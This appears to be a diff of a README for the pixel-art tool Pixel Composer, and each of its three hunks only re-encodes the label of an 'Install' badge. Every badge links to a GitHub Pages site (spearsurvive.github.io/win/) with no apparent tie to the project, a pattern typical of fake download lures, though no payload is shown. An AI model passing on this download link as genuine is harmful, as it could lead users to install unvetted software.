@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Pixel Composer](https://img.shields.io/badge/⬇_Install_Pixel%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Pixel Composer](https://img.shields.io/badge/⬇_Install_Pixel+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Pixel Composer is a free, open-source node-based pixel art and animation tool. I
 
 <div align="center">
 
-[![⬇ Install Pixel Composer](https://img.shields.io/badge/⬇_Install_Pixel%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Pixel Composer](https://img.shields.io/badge/⬇_Install_Pixel+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Pixel Composer is a free, open-source node-based pixel art and animation tool. I
 
 <div align="center">
 
-[![⬇ Install Pixel Composer](https://img.shields.io/badge/⬇_Install_Pixel%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Pixel Composer](https://img.shields.io/badge/⬇_Install_Pixel+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
